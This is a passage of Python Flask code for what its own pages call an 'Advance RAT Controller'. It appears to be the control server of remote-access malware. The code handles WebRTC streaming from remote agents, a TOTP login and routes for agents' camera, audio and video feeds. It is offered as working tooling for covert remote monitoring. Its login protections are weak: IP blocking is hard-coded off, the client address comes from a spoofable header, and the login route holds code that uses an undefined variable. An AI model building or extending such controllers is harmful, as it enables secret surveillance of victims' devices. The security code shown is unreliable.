        return None

def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on network conditions"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Determine optimal quality level based on bandwidth
        available_bandwidth = bandwidth_stats['available_bandwidth']
        current_bitrate = bandwidth_stats['current_bitrate']
        
        # Quality selection logic
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            optimal_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            optimal_quality = 'medium'
        else:
            optimal_quality = 'low'
        
        # Check if quality change is needed
        if current_quality != optimal_quality:
            print(f"Adaptive bitrate: Changing quality from {current_quality} to {optimal_quality}")
            print(f"Available bandwidth: {available_bandwidth:.0f} kbps, Current: {current_bitrate:.0f} kbps")
            
            # Emit quality change command to agent
            socketio.emit('webrtc_quality_change', {
                'agent_id': agent_id,
                'quality': optimal_quality,
                'bandwidth_stats': bandwidth_stats
            })
            
            return optimal_quality
        
        return current_quality
        
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        return None

def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high load"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return False
    
    try:
        # Check if psutil is available first
        try:
            import psutil
        except ImportError:
            print("psutil not available for load monitoring")
            return False
            
        # Get current system load
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        
        # Check if we're under high load
        if cpu_percent > (load_threshold * 100) or memory_percent > (load_threshold * 100):
            print(f"High load detected: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%")
            
            # Emit frame dropping command to agent
            socketio.emit('webrtc_frame_dropping', {
                'agent_id': agent_id,
                'enabled': True,
                'drop_ratio': 0.3,  # Drop 30% of frames
                'priority': 'keyframes_only'  # Keep keyframes, drop some intermediate frames
            })
            
            return True
        
        # Normal load - disable frame dropping
        socketio.emit('webrtc_frame_dropping', {
            'agent_id': agent_id,
            'enabled': False
        })
        
        return False
        
    except ImportError:
        print("psutil not available for load monitoring")
        return False
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        return False

def monitor_connection_quality(agent_id):
    """Monitor and log connection quality metrics"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Quality assessment
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('Low bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('High latency')
        
        # Check packet loss
        if bandwidth_stats['packets_lost'] > 0:
            quality_score -= 20
            quality_issues.append('Packet loss detected')
        
        # Check jitter
        if bandwidth_stats['jitter'] > 50:  # 50ms threshold
            quality_score -= 15
            quality_issues.append('High jitter')
        
        # Log quality metrics
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            print(f"Connection Quality for {agent_id}:")
            print(f"  Quality Score: {quality_score}/100")
            print(f"  Current Bitrate: {bandwidth_stats['current_bitrate']:.0f} kbps")
            print(f"  RTT: {bandwidth_stats['rtt']:.1f} ms")
            print(f"  Jitter: {bandwidth_stats['jitter']:.1f} ms")
            print(f"  Packets Lost: {bandwidth_stats['packets_lost']}")
            if quality_issues:
                print(f"  Issues: {', '.join(quality_issues)}")
        
        return {
            'quality_score': quality_score,
            'bandwidth_stats': bandwidth_stats,
            'quality_issues': quality_issues,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
    except Exception as e:
        print(f"Error monitoring connection quality for {agent_id}: {e}")
        return None

def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed connections"""
    if not WEBRTC_AVAILABLE:
        return False
    
    try:
        if agent_id in WEBRTC_PEER_CONNECTIONS:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Check connection state
            if pc.connectionState == 'failed' or pc.connectionState == 'disconnected':
                print(f"WebRTC connection failed for {agent_id}, attempting reconnection...")
                
                # Close failed connection
                try:
                    loop = asyncio.get_event_loop()
                    asyncio.run_coroutine_threadsafe(pc.close(), loop)
                except RuntimeError:
                    asyncio.run(pc.close())
                del WEBRTC_PEER_CONNECTIONS[agent_id]
                
                # Wait before reconnection attempt
                import time
                time.sleep(2)
                
                # Attempt reconnection
                new_pc = create_webrtc_peer_connection(agent_id)
                if new_pc:
                    print(f"Reconnection successful for {agent_id}")
                    return True
                else:
                    print(f"Reconnection failed for {agent_id}")
                    return False
        
        return True
        
    except Exception as e:
        print(f"Error in automatic reconnection for {agent_id}: {e}")
        return False

# Production Scale Monitoring and Migration Functions
def assess_production_readiness():
    """Assess current system's readiness for production scale"""
    try:
        current_agents = len(WEBRTC_PEER_CONNECTIONS)
        current_viewers = len(WEBRTC_VIEWERS)
        total_connections = current_agents + current_viewers
        
        readiness_report = {
            'current_implementation': PRODUCTION_SCALE['current_implementation'],
            'target_implementation': PRODUCTION_SCALE['target_implementation'],
            'migration_phase': PRODUCTION_SCALE['migration_phase'],
            'current_usage': {
                'agents': current_agents,
                'viewers': current_viewers,
                'total_connections': total_connections
            },
            'scalability_assessment': {
                'aiortc_limit_reached': current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'production_ready': current_viewers < PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'recommended_action': 'migrate_to_mediasoup' if current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] else 'continue_with_aiortc'
            },
            'performance_metrics': {},
            'recommendations': []
        }
        
        # Performance assessment
        if current_agents > 0:
            total_latency = 0
            total_bitrate = 0
            total_fps = 0
            agent_count = 0
            
            for agent_id in WEBRTC_PEER_CONNECTIONS:
                quality_data = monitor_connection_quality(agent_id)
                if quality_data:
                    total_latency += quality_data['bandwidth_stats']['rtt']
                    total_bitrate += quality_data['bandwidth_stats']['current_bitrate']
                    agent_count += 1
            
            if agent_count > 0:
                readiness_report['performance_metrics'] = {
                    'average_latency': total_latency / agent_count,
                    'average_bitrate': total_bitrate / agent_count,
                    'latency_target_met': (total_latency / agent_count) <= PRODUCTION_SCALE['performance_targets']['target_latency'],
                    'bitrate_target_met': (total_bitrate / agent_count) >= PRODUCTION_SCALE['performance_targets']['target_bitrate']
                }
        
        # Generate recommendations
        if readiness_report['scalability_assessment']['aiortc_limit_reached']:
            readiness_report['recommendations'].append('Immediate migration to mediasoup required for production scale')
        elif current_viewers > (PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] * 0.8):
            readiness_report['recommendations'].append('Approaching aiortc limits, plan mediasoup migration')
        
        if readiness_report['performance_metrics'].get('latency_target_met') == False:
            readiness_report['recommendations'].append('Optimize network configuration to meet latency targets')
        
        if readiness_report['performance_metrics'].get('bitrate_target_met') == False:
            readiness_report['recommendations'].append('Check bandwidth allocation and codec settings')
        
        return readiness_report
        
    except Exception as e:
        print(f"Error assessing production readiness: {e}")
        return None

def generate_mediasoup_migration_plan():
    """Generate detailed migration plan from aiortc to mediasoup"""
    try:
        migration_plan = {
            'current_state': {
                'implementation': 'aiortc_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'technology': 'Python + aiortc'
            },
            'target_state': {
                'implementation': 'mediasoup_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers'],
                'technology': 'Node.js + mediasoup'
            },
            'migration_phases': [
                {
                    'phase': 1,
                    'name': 'Parallel Implementation',
                    'description': 'Implement mediasoup alongside existing aiortc',
                    'duration': '2-3 weeks',
                    'tasks': [
                        'Set up Node.js mediasoup server',
                        'Implement mediasoup SFU logic',
                        'Create migration endpoints',
                        'Test with subset of viewers'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Gradual Migration',
                    'description': 'Migrate viewers from aiortc to mediasoup',
                    'duration': '1-2 weeks',
                    'tasks': [
                        'Implement viewer routing logic',
                        'Add load balancing between aiortc and mediasoup',
                        'Monitor performance during migration',
                        'Handle fallback scenarios'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Full Migration',
                    'description': 'Complete migration to mediasoup',
                    'duration': '1 week',
                    'tasks': [
                        'Migrate all remaining viewers',
                        'Decommission aiortc implementation',
                        'Performance validation',
                        'Documentation updates'
                    ]
                }
            ],
            'technical_requirements': [
                'Node.js 18+ runtime',
                'mediasoup library installation',
                'Redis for session management',
                'Load balancer configuration',
                'Monitoring and alerting setup'
            ],
            'estimated_effort': '4-6 weeks',
            'risk_assessment': 'Medium - requires careful testing and rollback plan'
        }
        
        return migration_plan
        
    except Exception as e:
        print(f"Error generating mediasoup migration plan: {e}")
        return None

def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with production-scale metrics"""
    try:
        monitoring_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'system_overview': {
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_viewers': len(WEBRTC_VIEWERS),
                'total_connections': len(WEBRTC_PEER_CONNECTIONS) + len(WEBRTC_VIEWERS),
                'system_load': {}
            },
            'performance_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {},
            'alerts': []
        }
        
        # System load monitoring
        try:
            import psutil
            monitoring_data['system_overview']['system_load'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
        except ImportError:
            monitoring_data['system_overview']['system_load'] = {'error': 'psutil not available'}
        
        # Performance metrics per agent
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            quality_data = monitor_connection_quality(agent_id)
            if quality_data:
                monitoring_data['performance_metrics'][agent_id] = quality_data
        
        # Quality assessment
        if monitoring_data['performance_metrics']:
            total_quality_score = sum(data['quality_score'] for data in monitoring_data['performance_metrics'].values())
            avg_quality_score = total_quality_score / len(monitoring_data['performance_metrics'])
            
            monitoring_data['quality_metrics'] = {
                'average_quality_score': avg_quality_score,
                'quality_distribution': {
                    'excellent': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] >= 90]),
                    'good': len([s for s in monitoring_data['performance_metrics'].values() if 70 <= s['quality_score'] < 90]),
                    'fair': len([s for s in monitoring_data['performance_metrics'].values() if 50 <= s['quality_score'] < 70]),
                    'poor': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] < 50])
                }
            }
        
        # Scalability assessment
        current_viewers = len(WEBRTC_VIEWERS)
        aiortc_limit = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_viewer_count': current_viewers,
            'aiortc_limit': aiortc_limit,
            'utilization_percentage': (current_viewers / aiortc_limit) * 100,
            'approaching_limit': current_viewers >= (aiortc_limit * 0.8),
            'limit_reached': current_viewers >= aiortc_limit
        }
        
        # Generate alerts
        if monitoring_data['scalability_metrics']['limit_reached']:
            monitoring_data['alerts'].append({
                'level': 'CRITICAL',
                'message': 'aiortc viewer limit reached - immediate migration required',
                'action': 'migrate_to_mediasoup'
            })
        elif monitoring_data['scalability_metrics']['approaching_limit']:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Approaching aiortc viewer limit - plan migration',
                'action': 'plan_migration'
            })
        
        # Quality alerts
        if monitoring_data['quality_metrics'].get('average_quality_score', 100) < 70:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Average connection quality below threshold',
                'action': 'investigate_network_issues'
            })
        
        return monitoring_data
        
    except Exception as e:
        print(f"Error in enhanced WebRTC monitoring: {e}")
        return None

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def get_client_ip():
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        ip = xff.split(',')[0].strip()
        if ip:
            return ip
    return request.environ.get('REMOTE_ADDR', request.remote_addr) or '0.0.0.0'

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    # Check session
    if not session.get('authenticated', False):
        return False
    
    # Enforce TOTP when required
    try:
        cfg = load_settings().get('authentication', {})
        secret = cfg.get('totpSecret')
        require_two_factor = bool(cfg.get('requireTwoFactor'))
        trusted_ok = False
        try:
            token = request.cookies.get('trusted_device')
            if token:
                h = hashlib.sha256(token.encode()).hexdigest()
                lst = cfg.get('trustedDevices') or []
                trusted_ok = h in lst
        except Exception:
            trusted_ok = False
        if require_two_factor:
            if not secret:
                return False
            if not session.get('otp_verified', False) and not trusted_ok:
                return False
    except Exception as _e:
        print(f"TOTP check error: {_e}")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
    if login_time:
        try:
            # Handle both formats: with and without 'Z'
            if login_time.endswith('Z'):
                login_datetime = datetime.datetime.fromisoformat(login_time.replace('Z', '+00:00'))
            else:
                login_datetime = datetime.datetime.fromisoformat(login_time)
                # Assume UTC if no timezone info
                if login_datetime.tzinfo is None:
                    login_datetime = login_datetime.replace(tzinfo=datetime.timezone.utc)
            
            current_time = datetime.datetime.now(datetime.timezone.utc)
            if (current_time - login_datetime).total_seconds() > Config.SESSION_TIMEOUT:
                session.clear()
                return False
        except Exception as e:
            print(f"Session authentication error: {e}")
            session.clear()
            return False
    
    return True

def is_ip_blocked(ip):
    return False

def record_failed_login(ip):
    """Record a failed login attempt for an IP"""
    if ip in LOGIN_ATTEMPTS:
        attempts, _ = LOGIN_ATTEMPTS[ip]
        LOGIN_ATTEMPTS[ip] = (attempts + 1, datetime.datetime.now())
    else:
        LOGIN_ATTEMPTS[ip] = (1, datetime.datetime.now())

def clear_login_attempts(ip):
    """Clear failed login attempts for an IP after successful login"""
    if ip in LOGIN_ATTEMPTS:
        del LOGIN_ATTEMPTS[ip]

def require_auth(f):
    """Decorator to require authentication for routes"""
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if is_authenticated():
        return redirect(url_for('dashboard'))
        
    # Serve React app for login page too
    # This allows the React app to handle the /login route with its own UI
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            if "</head>" in index_html:
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                modified = runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            # Fallback for when build is missing - just redirect to dashboard logic which handles errors
            return redirect(url_for('dashboard'))
    except Exception as e:
        print(f"Failed to serve React login page: {e}")
        return redirect(url_for('dashboard'))
    
    # Legacy controller-rendered login form is intentionally disabled.
    # The React app at /agent-controller ui v2.1/ handles the login UI now.
    # You can re-enable the server-side form by moving or removing the early returns above.
    
    # Check if IP is blocked
    if is_ip_blocked(client_ip):
        remaining_time = Config.LOGIN_TIMEOUT
        if client_ip in LOGIN_ATTEMPTS:
            remaining_time = Config.LOGIN_TIMEOUT - (datetime.datetime.now() - LOGIN_ATTEMPTS[client_ip][1]).total_seconds()
        flash(f'Too many failed login attempts. Please try again in {int(remaining_time)} seconds.', 'error')
        return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Advance RAT Controller - Login Blocked</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary-bg: #0a0a0f;
                --secondary-bg: #1a1a2e;
                --accent-blue: #00d4ff;
                --accent-purple: #6c5ce7;
                --accent-red: #ff4757;
                --text-primary: #ffffff;
                --text-secondary: #a0a0a0;
                --glass-bg: rgba(255, 255, 255, 0.05);
                --glass-border: rgba(255, 255, 255, 0.1);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
                color: var(--text-primary);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .login-container {
                background: var(--glass-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                text-align: center;
            }
            
            .login-header h1 {
                font-family: 'Orbitron', monospace;
                font-size: 2rem;
                font-weight: 900;
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 20px;
            }
            
            .error-message {
                background: rgba(255, 71, 87, 0.2);
                color: var(--accent-red);
                border: 1px solid var(--accent-red);
                border-radius: 8px;
                padding: 20px;
                margin-bottom: 20px;
                font-weight: 500;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }
            
            .retry-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>Advance RAT Controller</h1>
            </div>
            
            <div class="error-message">
                <h3>🔒 Access Temporarily Blocked</h3>
                <p>Too many failed login attempts detected.</p>
                <p>Please wait before trying again.</p>
            </div>
            
            <a href="/login" class="retry-btn">Try Again</a>
        </div>
    </body>
    </html>
    ''')
    
    if request.method == 'POST':
        password = request.form.get('password', '')
        otp_raw = request.form.get('otp', '') or request.form.get('totp', '')
        otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
        
        if verify_admin_or_operator(password):
            s = load_settings()
            auth = s.get('authentication', {})
            secret = auth.get('totpSecret')
            issuer = auth.get('issuer', 'Neural Control Hub')
            require_two_factor = bool(auth.get('requireTwoFactor'))
            if require_two_factor and (not secret or not auth.get('totpEnrolled')):
                secret = get_or_create_totp_secret()
                uri = pyotp.TOTP(secret).provisioning_uri(name='Authentication', issuer_name=issuer)
                img = qrcode.make(uri)
                buf = io.BytesIO()
                img.save(buf, format='PNG')
                qr_b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                flash('Two-factor authentication setup required. Scan the QR and enter OTP.', 'error')
                return render_template_string(login_template, qr_b64=qr_b64, secret=secret, require_totp=True, enrolled=False, issuer=issuer)
            if require_two_factor:
                if not otp:
                    flash('OTP required. Please enter the 6-digit code.', 'error')
                    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=True, enrolled=True, issuer=issuer)
                if not verify_totp_code(secret, str(otp), window=2):
                    record_failed_login(client_ip)
                    flash('Invalid OTP. Please try again.', 'error')
                    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=True, enrolled=True, issuer=issuer)
            # Successful password + OTP
            clear_login_attempts(client_ip)
            session['authenticated'] = True
            session['otp_verified'] = True if require_two_factor else False
            session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            session['login_ip'] = client_ip
            try:
                if require_two_factor:
                    auth['totpEnrolled'] = True
                s['authentication'] = auth
                save_settings(s)
            except Exception:
                pass
            return redirect(url_for('dashboard'))
        else:
            # Failed login
            record_failed_login(client_ip)
            attempts = LOGIN_ATTEMPTS.get(client_ip, (0, None))[0]
            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=require_totp, enrolled=enrolled, issuer=issuer)

# Serve React index for dashboard and root paths
def _serve_react_index():
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            if "</head>" in index_html:
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                modified = runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            return redirect(url_for('login'))
    except Exception as e:
        print(f"Failed to serve React index: {e}")
        return redirect(url_for('login'))

# Legacy root/dashboard serving handled by index() and dashboard() below

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Video storage configuration
VIDEO_STORAGE_PROVIDER = os.environ.get('VIDEO_STORAGE_PROVIDER')
VIDEO_STORAGE_BUCKET = os.environ.get('VIDEO_STORAGE_BUCKET')
VIDEO_BASE_URL = os.environ.get('VIDEO_BASE_URL')
VIDEO_URL_EXPIRES_IN = int(os.environ.get('VIDEO_URL_EXPIRES_IN', '900'))
ALLOW_UNSIGNED_VIDEO_URLS = os.environ.get('ALLOW_UNSIGNED_VIDEO_URLS', 'false').lower() == 'true'

def _video_key(kind: str, video_id: str) -> str:
    if kind == 'preview':
        return f"videos/previews/{video_id}.mp4"
    if kind == 'mp4':
        return f"videos/mp4/{video_id}_full.mp4"
    return f"videos/hls/{video_id}/master.m3u8"

def _generate_signed_url(key: str) -> Optional[str]:
    provider = (VIDEO_STORAGE_PROVIDER or '').lower()
    if provider == 's3':
        try:
            import boto3
            s3_kwargs = {}
            if os.environ.get('S3_ENDPOINT'):
                s3_kwargs['endpoint_url'] = os.environ.get('S3_ENDPOINT')
            if os.environ.get('AWS_ACCESS_KEY_ID') and os.environ.get('AWS_SECRET_ACCESS_KEY'):
                s3 = boto3.client('s3', **s3_kwargs)
            else:
                s3 = boto3.client('s3', **s3_kwargs)
            return s3.generate_presigned_url(
                ClientMethod='get_object',
                Params={'Bucket': VIDEO_STORAGE_BUCKET, 'Key': key},
                ExpiresIn=VIDEO_URL_EXPIRES_IN
            )
        except Exception as _e:
            return None
    if VIDEO_BASE_URL and ALLOW_UNSIGNED_VIDEO_URLS:
        return f"{VIDEO_BASE_URL.rstrip('/')}/{key}"
    return None

def _is_mobile_user_agent() -> bool:
    ua = request.headers.get('User-Agent', '')
    return bool(re.search(r'(Android|iPhone|iPad|Mobile)', ua, re.IGNORECASE))

def _is_slow_network() -> bool:
    save_data = request.headers.get('Save-Data', '').lower() == 'on'
    ect = request.headers.get('ECT', '').lower()
    return save_data or ect in ('slow-2g', '2g', '3g')

VIDEOS_CATALOG = [
    {'id': 'video123', 'title': 'Demo Short', 'duration': 120},
    {'id': 'video456', 'title': 'Demo Long', 'duration': 3600}
]

@app.route('/api/videos', methods=['GET'])
@require_auth
def list_videos():
    items = []
    for v in VIDEOS_CATALOG:
        vid = v['id']
        preview_key = _video_key('preview', vid)
        mp4_key = _video_key('mp4', vid)
        hls_key = _video_key('hls', vid)
        preview_url = _generate_signed_url(preview_key)
        mp4_url = _generate_signed_url(mp4_key)
        hls_url = _generate_signed_url(hls_key)
        items.append({
            'id': vid,
            'title': v.get('title', vid),
            'duration': v.get('duration', 0),
            'preview_url': preview_url,
            'mp4_url': mp4_url,
            'hls_url': hls_url
        })
    return jsonify({'videos': items})

@app.route('/api/videos/<video_id>/stream-source', methods=['GET'])
@require_auth
def get_video_stream_source(video_id: str):
    video = next((x for x in VIDEOS_CATALOG if x['id'] == video_id), None)
    if not video:
        return jsonify({'error': 'not_found'}), 404
    duration = int(video.get('duration', 0))
    if duration < 900:
        chosen = 'mp4'
    elif _is_mobile_user_agent() or _is_slow_network():
        chosen = 'hls'
    else:
        chosen = 'mp4'
    key = _video_key(chosen, video_id)
    url = _generate_signed_url(key)
    if not url:
        return jsonify({'error': 'signing_unavailable'}), 503
    return jsonify({'type': chosen, 'url': url, 'expires_in': VIDEO_URL_EXPIRES_IN})

# Protected stub endpoints for security tests
@app.route('/stream/<agent_id>')
@require_auth
def stream(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id})

@app.route('/video_feed/<agent_id>')
@require_auth
def video_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'video'})

@app.route('/camera_feed/<agent_id>')
@require_auth
def camera_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'camera'})

@app.route('/audio_feed/<agent_id>')
@require_auth
def audio_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'audio'})

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    s = load_settings().get('security', {})
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD or ''),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'blocked_ips_config_count': len(s.get('blocked_ips') or []),
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Advance RAT Controller — Best Practices Dashboard</title>

<!-- Fonts & libs -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>

<style>
  :root{
    --bg-1:#070709;         /* deep black */
    --bg-2:#0f1724;         /* dark blue/charcoal */
    --glass: rgba(255,255,255,0.03);
    --glass-2: rgba(255,255,255,0.04);
    --accent-a:#00d4ff;
    --accent-b:#7c5cff;
    --muted:#98a0b3;
    --card-border: rgba(255,255,255,0.04);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
  body{
    background: radial-gradient(1200px 600px at 10% 10%, rgba(30,40,60,0.3), transparent),
                radial-gradient(1000px 600px at 90% 90%, rgba(90,40,120,0.12), transparent),
                linear-gradient(180deg,var(--bg-1),var(--bg-2));
    color:#dbe7ff;
    -webkit-font-smoothing:antialiased;
    overflow:hidden;
  }

  /* Top navbar */
  .top-nav{
    height:68px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 22px;
    gap:16px;
    border-bottom:1px solid rgba(255,255,255,0.03);
    backdrop-filter:blur(6px);
    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
    position:relative;
  }
  .brand{
    display:flex;
    align-items:center;
    gap:14px;
  }
  .brand .logo{
    height:44px;width:44px;border-radius:10px;
    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
    color:#02111a; box-shadow:0 6px 20px rgba(0,0,0,0.6);
  }
  .brand h1{font-size:1.05rem;margin:0;color:#e8f5ff;font-weight:700}
  .nav-tabs{display:flex;gap:12px;margin-left:20px}
  .nav-tab{
